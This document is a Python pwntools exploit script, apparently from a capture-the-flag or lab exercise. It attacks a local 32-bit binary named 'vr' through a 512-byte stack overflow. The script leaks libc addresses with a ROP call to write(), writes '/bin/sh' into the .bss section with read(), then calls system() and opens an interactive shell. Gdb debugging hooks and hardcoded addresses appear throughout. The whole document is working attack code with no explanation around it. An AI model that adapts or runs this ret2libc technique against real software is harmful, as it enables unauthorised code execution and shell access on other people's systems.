from pwn import *

vul_func = 0x08048436
vr = ELF('vr')
write_plt = vr.symbols['write']
write_got = vr.got['write']
p = process('./vr')
#p = gdb.debug('./vr','''
#b *vulnerable_code + 56
#display /5i $pc
#display /10wx $esp
#display /3s 0x0804a020
#continue
#''')

def leak(address):
    shellcode = 512 * 'A'
    shellcode += p32(write_plt) + p32(vul_func) + p32(1) + p32(address) + p32(4)
    p.send(shellcode)
    return p.recv(4)

dyn = DynELF(leak, elf = vr)

#leak write() address
#write_addr = dyn.lookup('write','libc')
#system_addr = dyn.lookup('system', 'libc')
write_addr = 0xb7ec5cd0
system_addr = 0xb7e29b40

print 'vul func:\t' + hex(vul_func)
print "write address:\t" + hex(write_addr)
print "system address:\t" + hex(system_addr)

#write "/bin/sh" to .bss section
#readelf -S vr
bss_addr = 0x0804a020
read_plt = vr.symbols['read']
print "read plt:\t " + hex(read_plt)

shellcode = 512 * 'A'
#ROPgadget --binary vr --only "pop|ret"
pppr_addr = 0x08048519
print "pppr addr:\t " + hex(pppr_addr)
print "bss memory:\t " + hex(bss_addr)

#read(STDIN_FILENO, buffer_addr, buffer_size)
shellcode += p32(read_plt) + p32(vul_func) + p32(0) + p32(bss_addr) + p32(7)
p.send(shellcode)

input_string = '/bin/sh'
p.send(input_string)
gdb.attach(p, '''
b *vulnerable_code + 39
b *vulnerable_code + 56
b *__kernel_vsyscall+5
b *do_system+365
display /5i $pc
display /10wx $esp
display /3s 0x0804a020
display $eax
continue
''')
shellcode = 512 * 'A'
exit_func = 0xb7e1d7f0
shellcode += p32(system_addr) + p32(vul_func) + p32(bss_addr)
p.send(shellcode)
print '==========================='
p.interactive()
#p.wait_for_close()
